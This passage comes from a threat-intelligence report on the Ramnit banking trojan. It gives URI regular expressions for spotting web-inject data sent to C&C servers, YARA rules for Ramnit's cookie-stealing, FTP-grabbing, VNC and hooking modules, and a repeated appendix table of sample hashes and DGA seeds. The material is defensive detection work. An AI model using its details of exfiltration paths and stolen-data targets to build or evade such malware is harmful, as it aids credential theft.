“\\0x4D5A9020”\n\n        - Note: 0x4D4A is the equivalent of “MZ”.\n###### Web inject\n\n         - All gathered data from web injects is sent to a C&C server defined in the module’s configuration file using the\nfollowing URL structures. Detection can be implemented by inspecting HTTP traffic and matching the URI with\nthe following regular expressions:\n\n        - “/anz/input\\.php\\?id=.{1,255}&accName=”\n\n        - “/abb/input\\.php\\?id=[^&]{1,40}&dr=”\n\n        - “/abb/input2log\\.php\\?id=[^&]{1,40}&(BillingAddress|sort)=”\n\n         - “/abb/input2[a-z]{2,6}\\.php\\?id=[^&]{1,40}&(dr|r)=”\n\n        - “/anz/drin\\.php\\?id=[^&]{1,40}&v=2”\n\n        - “/[a-z]{2,4}/drin2stv3\\.php\\?id=[^&]{1,40}&v=8”\n\n         - “/ll/(insideb|(m|n)49)\\.php\\?id=[^&]{1,40}&status=”\n\n         - “/fd/i\\.php\\?id=”\n\n\n-----\n\n##### Yara signature\n\nThe following YARA signature detects all unpacked version of Ramnit modules:\n```\n           rule ramnit _ cookie _ module\n           {\n             meta:\n               tags = “Ramnit”\n             strings:\n\n```\n$cookie1 = “IE Cookies\\x00FireFox Cookies\\\\Profile %d\\\\cookies.txt\\\n```\n           x00”\n\n```\n$cookie2 = “Chrome\\\\Cookies\\x00Chrome\\\\Extension Cookies\\x00Opera\\\\\nProfile %d\\\\cookies4.dat\\x00”\n```\n             condition:\n               any of them\n           }\n           rule ramnit _ ftp _ grabber _ module\n           {\n             meta:\n               tags = “Ramnit”\n             strings:\n\n```\n$ftplist = “NetDrive\\x00\\x00\\x00\\x00FtpControl\\x00\\x00\\x00\\x00\\x00\\\nx0032bit FTP\\x00”\n```\n             condition:\n               $ftplist\n           }\n           rule ramnit _ ftp _ server _ module\n           {\n             meta:\n               tags = “Ramnit”\n             strings:\n\n```\n$ftpmsg = “220 220 RMNetwork FTP\\x00”\n```\n             condition:\n               $ftpmsg\n           }\n           rule ramnit _ hooker _ module\n           {\n             meta:\n               tags = “Ramnit”\n             strings:\n               //W.e.b.D.a.t.a.F.i.l.t.e.r.s...W.e.b.F.a.k.e.s.\n\n```\n$webfilter = “W\\x00e\\x00b\\x00D\\x00a\\x00t\\x00a\\x00F\\x00i\\x00l\\x00t\\x00e\\\nx00r\\x00s\\x00\\x00\\x00W\\x00e\\x00b\\x00F\\x00a\\x00k\\x00e\\x00s\\x00”\n```\n               //<.*.>.<.s.c.r.i.p.t.*.>.*.<./.s.c.r.i.p.t.>.\n\n```\n$script = “<\\x00*\\x00>\\x00<\\x00s\\x00c\\x00r\\x00i\\x00p\\x00t\\x00*\\x00>\\\nx00*\\x00<\\x00/\\x00s\\x00c\\x00r\\x00i\\x00p\\x00t\\x00>\\x00”\n```\n             condition:\n               all of them\n           }\n           rule ramnit _ vnc _ module\n           {\n             meta:\n               tags = “Ramnit”\n\n```\n\n-----\n\n```\n             strings:\n               //”.%.s.”. .%.s...”.%.s.”.....RFB ....RFB 003.003..\n\n```\n$rfb = “\\”\\x00%\\x00s\\x00\\”\\x00 \\x00%\\x00s\\x00\\x00\\x00\\”\\x00%\\x00s\\x00\\”\\\nx00\\x00\\x00\\x00\\x00RFB \\x00\\x00\\x00\\x00RFB 003\\x2E003\\x0A\\x00”\n```\n             condition:\n               $rfb\n           }\n           rule ramnit _ drivescan _ module\n           {\n             meta:\n               tags = “Ramnit”\n             strings:\n               /*\n               8B 75 08    mov   esi, [ebp+pattern]\n               8A 06      mov   al, [esi]\n               33 DB      xor   ebx, ebx\n               57       push  edi\n               3A C3      cmp   al, bl\n               74 ??      jz   short ??\n               3C 2A      cmp   al, ‘*’\n               74 ??      jz   short ??\n               3C 3F      cmp   al, ‘?’\n               74 ??      jz   ??\n               0F BE C0    movsx  eax, al\n               50       push  eax      \n               E8 ?? ?? ?? ?? call  toupper\n               8B 7D 0C    mov   edi, [ebp+path]\n               8B D8      mov   ebx, eax\n               0F BE 07    movsx  eax, byte ptr [edi]\n               50       push  eax      \n               E8 ?? ?? ?? ?? call  toupper\n               59       pop   ecx\n               */\n               $comparefn = {\n               8B 75 08   \n               8A 06    \n               33 DB    \n               57      \n               3A C3    \n               74 ??    \n               3C 2A    \n               74 ??    \n               3C 3F    \n               74 ??    \n               0F BE C0   \n               50      \n               E8 ?? ?? ?? ??\n               8B 7D 0C   \n               8B D8    \n               0F BE 07   \n               50      \n               E8 ?? ?? ?? ??\n               59 }\n             condition:\n               $comparefn  \n           }\n\n```\n\n-----\n\n### APPENDIX\n\n\n-----\n\n|amnit samples and DGA seed|Col2|Col3|\n|---|---|---|\n|Table 9. Ramnit samples and DGA seeds|||\n|MD5|DGA Seed|PE Timestamp|\n|33cd65ebd943a41a3b65fa1ccfce067c|0x606D35BF|06/06/2011|\n|9b97b3ca2b2c513edf4505e3a7a8b3aa|0x8E922C43|07/12/2011|\n|3bb86e6920614ed9ac5d8fbf480eb437|0x8E922C43|07/22/2011|\n|7a6cee0de2aad7a5f40d71b9d632c398|0x64BED2B7|07/22/2011|\n|7b885f3ec7037344c3f627cbfd5d63b8|0x64BED2B7|07/22/2011|\n|2fd2dcba0b787961f6497e5c106a167c|0x8E922C43|08/26/2011|\n|654ebc3fb34aeb6b0fc15c3df6f86fad|0x8E922C43|08/26/2011|\n|ba9048574c81cd438cbea36fb4307843|0x606D35BF|08/26/2011|\n|0de06fbfa40feac5502184513371a508|0x64BED2B7|08/26/2011|\n|607b2219fbcfbfe8e6ac9d7f3fb8d50e|0x64BED2B7|08/26/2011|\n|8029e21548a740e945f90afd046a1797|0x64BED2B7|08/26/2011|\n|8b73198992c98f26581a3d81ab1e8e94|0x64BED2B7|08/26/2011|\n|448ce1c565c4378b310fa25b4ae3b17f|0x8E922C43|09/14/2011|\n|a06539e080f0796c507ea485effbc8b0|0x8E922C43|09/14/2011|\n|2e29ad5349075a8e659b04ddae166951|0x8E922C43|10/03/2011|\n|c64f5795e162cb81b0539dc27358ad1a|0x8E922C43|10/03/2011|\n|d4b626c22e0e01b5f28f2c7a95aafd6f|0x8E922C43|10/03/2011|\n|44734e698404dabb1ff0c4d20491b225|0x64BED2B7|10/03/2011|\n|71723d219421a7ff310f8402b3b33a8b|0x64BED2B7|10/03/2011|\n|8845ee4284fd4956fd83c87df37ea55e|0x64BED2B7|10/03/2011|\n|64cca5310cf889873393caef678f1915|0x64BED2B7|10/30/2011|\n|1da54d5e32c2fb546243bfabc678575e|0x166E0B2B|11/21/2011|\n|b27f9fa227c373b12ab10c58d72118a9|0x166E0B2B|11/21/2011|\n|badd781d5e34e1980f53d9a41b24e03c|0x166E0B2B|11/21/2011|\n|2be743fa70c7628b9f43039f97833c3e|0x64BED2B7|11/28/2011|\n|81059b1e9943b6f6ae1bdacf3e286767|0x64BED2B7|11/28/2011|\n|16f678a9f654d396d0adc8c7011f272e|0x6C21075|12/14/2011|\n|eb09c14688ac4b5b9f01ebb9b47c1eb2|0x6C21075|12/14/2011|\n|f0e37c0d56601fd90a9214e09a50d37e|0x6C21075|12/14/2011|\n|f83b1622684a68fc34d7b1225e4c8f19|0x6C21075|12/14/2011|\n|fa060f23e51febba321e0d1fc9bfa8cd|0x6C21075|12/14/2011|\n|9b9128872d84fb358fdd915051b1132d|0x5B034147|12/20/2011|\n|971cb5f32a2c09ab6e69eef612801ab4|0x5B034147|12/22/2011|\n|a80f1a06161d3b6a3b1b14162cce3fbb|0x5B034147|12/22/2011|\n|ad1581a237f6e73631b509e1ba50b3a1|0x5B034147|12/30/2011|\n|5a39155dcfa73ab9d221a9e877bb66d0|0x64BED2B7|01/02/2012|\n|a49e6792aeac708a114163867a2a3147|0x5B034147|01/03/2012|\n|ad0dcec8f20c5185fbeda1a139da20d1|0x5B034147|01/03/2012|\n|73d38ed0fc887c2d424ade98393319f2|0x64BED2B7|01/04/2012|\n\n\n#### Appendix\n\n##### Ramnit samples and DGA seed\n\n_Table 9. Ramnit samples and DGA seeds_\n\nMD5 DGA Seed PE Timestamp\n\n33cd65ebd943a41a3b65fa1ccfce067c 0x606D35BF 06/06/2011\n\n9b97b3ca2b2c513edf4505e3a7a8b3aa 0x8E922C43 07/12/2011\n\n3bb86e6920614ed9ac5d8fbf480eb437 0x8E922C43 07/22/2011\n\n7a6cee0de2aad7a5f40d71b9d632c398 0x64BED2B7 07/22/2011\n\n7b885f3ec7037344c3f627cbfd5d63b8 0x64BED2B7 07/22/2011\n\n2fd2dcba0b787961f6497e5c106a167c 0x8E922C43 08/26/2011\n\n654ebc3fb34aeb6b0fc15c3df6f86fad 0x8E922C43 08/26/2011\n\nba9048574c81cd438cbea36fb4307843 0x606D35BF 08/26/2011\n\n0de06fbfa40feac5502184513371a508 0x64BED2B7 08/26/2011\n\n607b2219fbcfbfe8e6ac9d7f3fb8d50e 0x64BED2B7 08/26/2011\n\n8029e21548a740e945f90afd046a1797 0x64BED2B7 08/26/2011\n\n8b73198992c98f26581a3d81ab1e8e94 0x64BED2B7 08/26/2011\n\n448ce1c565c4378b310fa25b4ae3b17f 0x8E922C43 09/14/2011\n\na06539e080f0796c507ea485effbc8b0 0x8E922C43 09/14/2011\n\n2e29ad5349075a8e659b04ddae166951 0x8E922C43 10/03/2011\n\nc64f5795e162cb81b0539dc27358ad1a 0x8E922C43 10/03/2011\n\nd4b626c22e0e01b5f28f2c7a95aafd6f 0x8E922C43 10/03/2011\n\n44734e698404dabb1ff0c4d20491b225 0x64BED2B7 10/03/2011\n\n71723d219421a7ff310f8402b3b33a8b 0x64BED2B7 10/03/2011\n\n8845ee4284fd4956fd83c87df37ea55e 0x64BED2B7 10/03/2011\n\n64cca5310cf889873393caef678f1915 0x64BED2B7 10/30/2011\n\n1da54d5e32c2fb546243bfabc678575e 0x166E0B2B 11/21/2011\n\nb27f9fa227c373b12ab10c58d72118a9 0x166E0B2B 11/21/2011\n\nbadd781d5e34e1980f53d9a41b24e03c 0x166E0B2B 11/21/2011\n\n2be743fa70c7628b9f43039f97833c3e 0x64BED2B7 11/28/2011\n\n81059b1e9943b6f6ae1bdacf3e286767 0x64BED2B7 11/28/2011\n\n16f678a9f654d396d0adc8c7011f272e 0x6C21075 12/14/2011\n\neb09c14688ac4b5b9f01ebb9b47c1eb2 0x6C21075 12/14/2011\n\nf0e37c0d56601fd90a9214e09a50d37e 0x6C21075 12/14/2011\n\nf83b1622684a68fc34d7b1225e4c8f19 0x6C21075 12/14/2011\n\nfa060f23e51febba321e0d1fc9bfa8cd 0x6C21075 12/14/2011\n\n9b9128872d84fb358fdd915051b1132d 0x5B034147 12/20/2011\n\n971cb5f32a2c09ab6e69eef612801ab4 0x5B034147 12/22/2011\n\na80f1a06161d3b6a3b1b14162cce3fbb 0x5B034147 12/22/2011\n\nad1581a237f6e73631b509e1ba50b3a1 0x5B034147 12/30/2011\n\n5a39155dcfa73ab9d221a9e877bb66d0 0x64BED2B7 01/02/2012\n\na49e6792aeac708a114163867a2a3147 0x5B034147 01/03/2012\n\nad0dcec8f20c5185fbeda1a139da20d1 0x5B034147 01/03/2012\n\n73d38ed0fc887c2d424ade98393319f2 0x64BED2B7 01/04/2012\n\n\n-----\n\n|5a52c4f95e9e77265eb735aa8f08abdf|0x64BED2B7|01/05/2012|\n|---|---|---|\n|9380683d2c2903848514a7ca884cfc0f|0x5B034147|01/05/2012|\n|a2ffc0bded51b2cf0d9d170598c405a5|0x5B034147|01/05/2012|\n|02a7844529ad7639a1367d50f9f0f90d|0x5B034147|01/06/2012|\n|1093158a93efd6a813e57ce647b81735|0x5961363A|01/08/2012|\n|279024aaa681a3340a92b60040a78a67|0x64BED2B7|01/08/2012|\n|6f1914064d57ef7ab8e1296058735da4|0x64BED2B7|01/08/2012|\n|7663dfcbfa7ed3ca3d64b13bcda5e348|0x64BED2B7|01/08/2012|\n|8eabda5d2f22682dbecb2f5b31605a9e|0x64BED2B7|01/08/2012|\n|ebe41aaa72db56bc5f7f10b83d56485b|0x6C21075|01/29/2012|\n|79f62bbc89f91cf509a5b336b8f540c9|0x28488EEA|02/28/2012|\n|3822d91582b9537ed16fa5c63c590531|0x28488EEA|02/29/2012|\n|4e05a5ca4bac745470e7b44d61588ea6|0x28488EEA|04/03/2012|\n|e73fb95b9fa72cac48e90b40761ef02d|0x28488EEA|04/04/2012|\n|d3d3d4949e5b2c1080fd6c4c9ad31d72|0x28488EEA|05/02/2012|\n|1f536879edc8c185f9a5d38778bf7a21|0x3215D01B|05/07/2012|\n|e045b29e24c42812f1092e502183ca98|0x28488EEA|05/11/2012|\n|690b6a39411c147444c72da6fcce21ec|0x28488EEA|05/23/2012|\n|bfd148743d7617d5813a74e46894d504|0x28488EEA|05/30/2012|\n|383f6a347b4b4ab8f524afce482543e9|0xC17317B9|06/07/2012|\n|adb351bb5a07de416b0ec2fd8bb6dbdf|0xC17317B9|06/07/2012|\n|b0c11903d2e5f3527e07a6b51f6bba79|0xC17317B9|06/07/2012|\n|8690f45c045802da2afda4e6b71ec9b0|0xC17317B9|06/27/2012|\n|7e0da7200c4513bc24bdc00fb35a9a75|0xC17317B9|06/28/2012|\n|1039110f0edc406ff96310b2b8f8a0a4|0xC17317B9|07/03/2012|\n|d75049d79a14ba607098b88cc5894799|0xC17317B9|07/03/2012|\n|e57b44bb3326c9b92a155692b443c820|0xC17317B9|07/03/2012|\n|f997cc0e403d6fd26f32011166aa1d30|0xC17317B9|07/03/2012|\n|825274da547670803e7c4047d737d03e|0x28488EEA|07/04/2012|\n|cf2b8efb68d2d8e16df8e3cb76daae23|0x28488EEA|07/04/2012|\n|079a4a9402199be840aa094485a812b8|0xC17317B9|07/09/2012|\n|8f0eb8299491d218e346379b7964ff50|0x64BED2B7|07/13/2012|\n|3e4932eb7f2fb08dae28e72105f01ac3|0x28488EEA|07/19/2012|\n|440219016492ab714ec50eba174795b1|0x28488EEA|07/19/2012|\n|63412cf0a6a890e2066e82547283dcba|0x28488EEA|07/19/2012|\n|ad68f9009d46a735e53b1eba0d1b3890|0x28488EEA|07/19/2012|\n|0a1a58831065df4c325aa9f2b5969321|0x28488EEA|09/06/2012|\n|17ead9369fd2463bd9ccdfb4c2203846|0x28488EEA|09/06/2012|\n|1a84ba8bd5fd7359ab5bde94f75f5ddc|0x28488EEA|09/06/2012|\n|3afc16d1fdbd0d85124b0efd20703e44|0x28488EEA|09/06/2012|\n|5e0b63583b53d39d2c5bcd9bc5548b1e|0x28488EEA|09/06/2012|\n|69b702ec5b32f2cf025e9961bee612a0|0x28488EEA|09/06/2012|\n|7b3899409093e93f052fbef42457d07e|0x28488EEA|09/06/2012|\n|8964ac4c902d5bbbe2502ecb49f1ac33|0x28488EEA|09/06/2012|\n|bcb4935c83ccec9febb1052e1ed23fa2|0x28488EEA|09/06/2012|\n|ee4f02bd915313b9a5f0536185feefa4|0x28488EEA|09/06/2012|\n|547dc94247a70ea9ed8b44c90b419dbb|0x28488EEA|09/06/2012|\n\n\n5a52c4f95e9e77265eb735aa8f08abdf 0x64BED2B7 01/05/2012\n\n9380683d2c2903848514a7ca884cfc0f 0x5B034147 01/05/2012\n\na2ffc0bded51b2cf0d9d170598c405a5 0x5B034147 01/05/2012\n\n02a7844529ad7639a1367d50f9f0f90d 0x5B034147 01/06/2012\n\n1093158a93efd6a813e57ce647b81735 0x5961363A 01/08/2012\n\n279024aaa681a3340a92b60040a78a67 0x64BED2B7 01/08/2012\n\n6f1914064d57ef7ab8e1296058735da4 0x64BED2B7 01/08/2012\n\n7663dfcbfa7ed3ca3d64b13bcda5e348 0x64BED2B7 01/08/2012\n\n8eabda5d2f22682dbecb2f5b31605a9e 0x64BED2B7 01/08/2012\n\nebe41aaa72db56bc5f7f10b83d56485b 0x6C21075 01/29/2012\n\n79f62bbc89f91cf509a5b336b8f540c9 0x28488EEA 02/28/2012\n\n3822d91582b9537ed16fa5c63c590531 0x28488EEA 02/29/2012\n\n4e05a5ca4bac745470e7b44d61588ea6 0x28488EEA 04/03/2012\n\ne73fb95b9fa72cac48e90b40761ef02d 0x28488EEA 04/04/2012\n\nd3d3d4949e5b2c1080fd6c4c9ad31d72 0x28488EEA 05/02/2012\n\n1f536879edc8c185f9a5d38778bf7a21 0x3215D01B 05/07/2012\n\ne045b29e24c42812f1092e502183ca98 0x28488EEA 05/11/2012\n\n690b6a39411c147444c72da6fcce21ec 0x28488EEA 05/23/2012\n\nbfd148743d7617d5813a74e46894d504 0x28488EEA 05/30/2012\n\n383f6a347b4b4ab8f524afce482543e9 0xC17317B9 06/07/2012\n\nadb351bb5a07de416b0ec2fd8bb6dbdf 0xC17317B9 06/07/2012\n\nb0c11903d2e5f3527e07a6b51f6bba79 0xC17317B9 06/07/2012\n\n8690f45c045802da2afda4e6b71ec9b0 0xC17317B9 06/27/2012\n\n7e0da7200c4513bc24bdc00fb35a9a75 0xC17317B9 06/28/2012\n\n1039110f0edc406ff96310b2b8f8a0a4 0xC17317B9 07/03/2012\n\nd75049d79a14ba607098b88cc5894799 0xC17317B9 07/03/2012\n\ne57b44bb3326c9b92a155692b443c820 0xC17317B9 07/03/2012\n\nf997cc0e403d6fd26f32011166aa1d30 0xC17317B9 07/03/2012\n\n825274da547670803e7c4047d737d03e 0x28488EEA 07/04/2012\n\ncf2b8efb68d2d8e16df8e3cb76daae23 0x28488EEA 07/04/2012\n\n079a4a9402199be840aa094485a812b8 0xC17317B9 07/09/2012\n\n8f0eb8299491d218e346379b7964ff50 0x64BED2B7 07/13/2012\n\n3e4932eb7f2fb08dae28e72105f01ac3 0x28488EEA 07/19/2012\n\n440219016492ab714ec50eba174795b1 0x28488EEA 07/19/2012\n\n63412cf0a6a890e2066e82547283dcba 0x28488EEA 07/19/2012\n\nad68f9009d46a735e53b1eba0d1b3890 0x28488EEA 07/19/2012\n\n0a1a58831065df4c325aa9f2b5969321 0x28488EEA 09/06/2012\n\n17ead9369fd2463bd9ccdfb4c2203846 0x28488EEA 09/06/2012\n\n1a84ba8bd5fd7359ab5bde94f75f5ddc 0x28488EEA 09/06/2012\n\n3afc16d1fdbd0d85124b0efd20703e44 0x28488EEA 09/06/2012\n\n5e0b63583b53d39d2c5bcd9bc5548b1e 0x28488EEA 09/06/2012\n\n69b702ec5b32f2cf025e9961bee612a0 0x28488EEA 09/06/2012\n\n7b3899409093e93f052fbef42457d07e 0x28488EEA 09/06/2012\n\n8964ac4c902d5bbbe2502ecb49f1ac33 0x28488EEA 09/06/2012\n\nbcb4935c83ccec9febb1052e1ed23fa2 0x28488EEA 09/06/2012\n\nee4f02bd915313b9a5f0536185feefa4 0x28488EEA 09/06/2012\n\n547dc94247a70ea9ed8b44c90b419dbb 0x28488EEA 09/06/2012\n\n\n-----\n\n|13b8f03b8328029fb4ff342e1ff5b47b|0xDF8F43A4|09/07/2012|\n|---|---|---|\n|dc8317ff3db7d644134edc5053d786de|0xDF8F43A4|09/07/2012|\n|e085ea98cb79e83f59aa73b18ae34030|0xDF8F43A4|09/07/2012|\n|e472dc33df889fdbfd64d89d1c7ff2ed|0xDF8F43A4|09/07/2012|\n|3615ecd9dbc7982f57e8d00c4e494983|0xC17317B9|09/22/2012|\n|76991eefea6cb01e1d7435ae973858e6|0x64BED2B7|10/31/2012|\n|e9a7bbfdfd027c263c5587bdd79bc3e7|0xDF8F43A4|11/02/2012|\n|96b921b669ff90851dc7f7785e336b47|0xCFFC7DAB|11/22/2012|\n|9f8d4222d61db12b0114f5c332de255e|0xCFFC7DAB|11/22/2012|\n|b19633c9f11db5667c13b2b14a0dc299|0xCFFC7DAB|11/22/2012|\n|dc8ed96d97b19005b63830fd8419f5cf|0x4BFCBC6A|01/09/2013|\n|45c00d162c9fb776e3fedc269fe316ab|0x4BFCBC6A|01/27/2013|\n|a4d144c427bdb098750e15d07af9b315|0x4BFCBC6A|01/27/2013|\n|cbdd7c07ae47f92cc66ce9c76aec42ca|0x4BFCBC6A|01/27/2013|\n|a064821a6b4fdd0898e809659f11c52a|0x4BFCBC6A|02/25/2013|\n|d1f0bde70458c2e553f28b0bed5c1c74|0x4BFCBC6A|03/14/2013|\n|12cc48b1fd45575e93b942c08b88a1af|0x4BFCBC6A|04/04/2013|\n|aa54e54baaf172e5baec623597f31b99|0x4BFCBC6A|04/04/2013|\n|ef9f407fb11791bc2d7ffddb14ddf82f|0x4BFCBC6A|04/05/2013|\n|8ac77b94f46617027b2b5b7c86cfd3e0|0x4BFCBC6A|04/06/2013|\n|f2e6db95c6652b1f7d5b02d6108e485a|0x4BFCBC6A|04/06/2013|\n|1bbef19a2002b535fc57ef7925c4319b|0x4BFCBC6A|04/07/2013|\n|664cd144b9eab1c1ed23bf0f18796ed1|0x4BFCBC6A|04/07/2013|\n|7583aeb7bc7b7763428169cb911556c0|0x4BFCBC6A|04/08/2013|\n|272db67e8173b09317ab198c8e5138ea|0x4BFCBC6A|04/09/2013|\n|97bf30328100997d9be776c00eb80873|0x4BFCBC6A|04/18/2013|\n|0ad825e3885f6ef23d89b930b716ad5a|0x4BFCBC6A|04/19/2013|\n|ef70046e5350d05a08dc14435a9d2291|0x4EC815E2|05/04/2013|\n|a4a5f40af6f1f19af7180bc52597e5e6|0x4EC815E2|07/03/2013|\n|b06966d77e3949e1e5edf64c82e54b1e|0x4EC815E2|07/03/2013|\n|53f0a728eb37a5824d5ee83034498381|0x4EC815E2|07/11/2013|\n|a8057e15f80588d275d23ab80049bc91|0x4EC815E2|07/22/2013|\n|2632a59a2cca4dc34c1623345062c50e|0x4EC815E2|07/27/2013|\n|a72d218b19c3fd195cb82e0ba4869b03|0x4EC815E2|09/17/2013|\n|70720245a96fef4151eb507ef2c6f3b6|0x4EC815E2|09/22/2013|\n|2490d8824cd3d7ce683f17ad367300c3|0x4EC815E2|11/09/2013|\n|8ef8192ff8c1ad89baa65dae684ba426|0x4EC815E2|11/11/2013|\n|56a8487ae756fe1e95672a34dab05b2e|0x4EC815E2|11/18/2013|\n|b7b4e8d20f3b643c2e802590ee6b219a|0x4EC815E2|11/27/2013|\n|2ecb06075834295145ea0ca599e0ab2a|0x6CB5A7D9|11/29/2013|\n|99b3a23c6a5ba8292dcaffd014eb8746|0x4EC815E2|12/02/2013|\n|ea33dd22b8345c85fb20449134d90005|0x6CB5A7D9|12/20/2013|\n|3a61b25bfdbb945bc0ac3cf03f712e79|0x6CB5A7D9|01/10/2014|\n|80c0d1a09c8a525404ec8578d2c5861c|0x6CB5A7D9|01/15/2014|\n|b6378abc58dfffdf0400d4f2fefba4cb|0x6CB5A7D9|01/19/2014|\n|ce765bf847ad6200909134d7db30d147|0x6CB5A7D9|01/20/2014|\n|056af1afdc305dd978c728653c4ee08b|0x6CB5A7D9|01/21/2014|\n\n\n13b8f03b8328029fb4ff342e1ff5b47b 0xDF8F43A4 09/07/2012\n\ndc8317ff3db7d644134edc5053d786de 0xDF8F43A4 09/07/2012\n\ne085ea98cb79e83f59aa73b18ae34030 0xDF8F43A4 09/07/2012\n\ne472dc33df889fdbfd64d89d1c7ff2ed 0xDF8F43A4 09/07/2012\n\n3615ecd9dbc7982f57e8d00c4e494983 0xC17317B9 09/22/2012\n\n76991eefea6cb01e1d7435ae973858e6 0x64BED2B7 10/31/2012\n\ne9a7bbfdfd027c263c5587bdd79bc3e7 0xDF8F43A4 11/02/2012\n\n96b921b669ff90851dc7f7785e336b47 0xCFFC7DAB 11/22/2012\n\n9f8d4222d61db12b0114f5c332de255e 0xCFFC7DAB 11/22/2012\n\nb19633c9f11db5667c13b2b14a0dc299 0xCFFC7DAB 11/22/2012\n\ndc8ed96d97b19005b63830fd8419f5cf 0x4BFCBC6A 01/09/2013\n\n45c00d162c9fb776e3fedc269fe316ab 0x4BFCBC6A 01/27/2013\n\na4d144c427bdb098750e15d07af9b315 0x4BFCBC6A 01/27/2013\n\ncbdd7c07ae47f92cc66ce9c76aec42ca 0x4BFCBC6A 01/27/2013\n\na064821a6b4fdd0898e809659f11c52a 0x4BFCBC6A 02/25/2013\n\nd1f0bde70458c2e553f28b0bed5c1c74 0x4BFCBC6A 03/14/2013\n\n12cc48b1fd45575e93b942c08b88a1af 0x4BFCBC6A 04/04/2013\n\naa54e54baaf172e5baec623597f31b99 0x4BFCBC6A 04/04/2013\n\nef9f407fb11791bc2d7ffddb14ddf82f 0x4BFCBC6A 04/05/2013\n\n8ac77b94f46617027b2b5b7c86cfd3e0 0x4BFCBC6A 04/06/2013\n\nf2e6db95c6652b1f7d5b02d6108e485a 0x4BFCBC6A 04/06/2013\n\n1bbef19a2002b535fc57ef7925c4319b 0x4BFCBC6A 04/07/2013\n\n664cd144b9eab1c1ed23bf0f18796ed1 0x4BFCBC6A 04/07/2013\n\n7583aeb7bc7b7763428169cb911556c0 0x4BFCBC6A 04/08/2013\n\n272db67e8173b09317ab198c8e5138ea 0x4BFCBC6A 04/09/2013\n\n97bf30328100997d9be776c00eb80873 0x4BFCBC6A 04/18/2013\n\n0ad825e3885f6ef23d89b930b716ad5a 0x4BFCBC6A 04/19/2013\n\nef70046e5350d05a08dc14435a9d2291 0x4EC815E2 05/04/2013\n\na4a5f40af6f1f19af7180bc52597e5e6 0x4EC815E2 07/03/2013\n\nb06966d77e3949e1e5edf64c82e54b1e 0x4EC815E2 07/03/2013\n\n53f0a728eb37a5824d5ee83034498381 0x4EC815E2 07/11/2013\n\na8057e15f80588d275d23ab80049bc91 0x4EC815E2 07/22/2013\n\n2632a59a2cca4dc34c1623345062c50e 0x4EC815E2 07/27/2013\n\na72d218b19c3fd195cb82e0ba4869b03 0x4EC815E2 09/17/2013\n\n70720245a96fef4151eb507ef2c6f3b6 0x4EC815E2 09/22/2013\n\n2490d8824cd3d7ce683f17ad367300c3 0x4EC815E2 11/09/2013\n\n8ef8192ff8c1ad89baa65dae684ba426 0x4EC815E2 11/11/2013\n\n56a8487ae756fe1e95672a34dab05b2e 0x4EC815E2 11/18/2013\n\nb7b4e8d20f3b643c2e802590ee6b219a 0x4EC815E2 11/27/2013\n\n2ecb06075834295145ea0ca599e0ab2a 0x6CB5A7D9 11/29/2013\n\n99b3a23c6a5ba8292dcaffd014eb8746 0x4EC815E2 12/02/2013\n\nea33dd22b8345c85fb20449134d90005 0x6CB5A7D9 12/20/2013\n\n3a61b25bfdbb945bc0ac3cf03f712e79 0x6CB5A7D9 01/10/2014\n\n80c0d1a09c8a525404ec8578d2c5861c 0x6CB5A7D9 01/15/2014\n\nb6378abc58dfffdf0400d4f2fefba4cb 0x6CB5A7D9 01/19/2014\n\nce765bf847ad6200909134d7db30d147 0x6CB5A7D9 01/20/2014\n\n056af1afdc305dd978c728653c4ee08b 0x6CB5A7D9 01/21/2014\n\n\n-----\n\n|a4fc1b0b4588bee657b97b3dc93699b1|0x6CB5A7D9|01/23/2014|\n|---|---|---|\n|bfbf1ada395bd77005e5546d99970bd5|0x6CB5A7D9|01/26/2014|\n|a7b357684a3c8ab8389b7bc93182c2be|0x6CB5A7D9|01/29/2014|\n|27758b919505e69311158bd5bccff5e1|0x6CB5A7D9|01/31/2014|\n|0187d53659703ebef9480113b164bce2|0x6CB5A7D9|02/06/2014|\n|6123ca0fd71708e17e34b79a13ba809d|0x6CB5A7D9|02/13/2014|\n|02c2bcb51940e516e042ca5f8cc298cf|0x6CB5A7D9|02/13/2014|\n|43562f96b322a6f8deb596dbd7fcccaa|0x6CB5A7D9|02/14/2014|\n|bc5e22f80718c5bbeb4e6854fa47e53d|0x6CB5A7D9|02/14/2014|\n|d232783ce30792412944f1c8c5e944fa|0x6CB5A7D9|02/25/2014|\n|2f2a7f60791dd08932892c81aca462c6|0x6CB5A7D9|03/12/2014|\n|e20ede29b4e9cfb520955c4d600484ce|0x6CB5A7D9|03/28/2014|\n|ad46485cf22f97304f69d78a69d47cdf|0x6CB5A7D9|03/29/2014|\n|3d44ebc7f005d4eb1709400945da20da|0x79159C10|04/08/2014|\n|7aee496c13fa793a6b111ee20de727c4|0x79159C10|04/26/2014|\n|12d0efe0228f4ad95d91dc0c48313552|0x79159C10|07/12/2014|\n|14a6cfe2384495308f200ba09f5530e2|0x79159C10|08/22/2014|\n|0265903976bd21080da3b00c9d7ecdb3|0x79159C10|08/23/2014|\n|ecc4940acfd8b08e809215cfb523a0b1|0x79159C10|08/23/2014|\n|548c4eba63928ffab4ea6960c61c976e|0x79159C10|08/26/2014|\n|4538c3c3eaf10d14f7e826bf620faa82|0x79159C10|09/01/2014|\n|1ba3ebeb03494859f2da56c44b10eae8|0x79159C10|09/02/2014|\n|2bcb0d51cdd9afb3d098ece8137d60eb|0x79159C10|09/17/2014|\n|003d819078a9fee38dd0d0b77bdafb25|0x79159C10|09/20/2014|\n|30e5d2f3c99168aba0e0abd312ba6a27|0x79159C10|10/05/2014|\n|18086065d518213b31a454081d4f385b|0x79159C10|10/21/2014|\n|22849b1b4432fd60297746f9bb690239|0x79159C10|10/25/2014|\n|8f20ec6bdcc03f7d45a1baeeaf551115|0x79159C10|10/25/2014|\n|05e2b4e5b5084b2103e05fb39c1d0263|0x79159C10|10/26/2014|\n|07dd1865b30000b5e447676b34ac61dd|0x79159C10|10/27/2014|\n|5467ba99eeb7dc459417af1c3945ca34|0x79159C10|10/29/2014|\n|14196aeedc92c3ca8a3d813341b990f6|0x79159C10|10/30/2014|\n|2255dad450997321d63ad29e12a661b2|0x79159C10|10/30/2014|\n|0fb3d555f0ba510d6dcd4c1c1177e507|0x79159C10|11/02/2014|\n|114ed09112f43cf9df72f5dc586ce07b|0x79159C10|11/03/2014|\n|2caf2643241d4a38b35250e1117462c6|0x79159C10|11/04/2014|\n|155b5d45eb1f0fbdc95b1b3ac087b349|0x79159C10|11/05/2014|\n|0dbb8b7a073f1306b700b513af715d8a|0x79159C10|11/10/2014|\n|285cc5d36bb412c544d930032695a1a7|0x79159C10|11/10/2014|\n\n\na4fc1b0b4588bee657b97b3dc93699b1 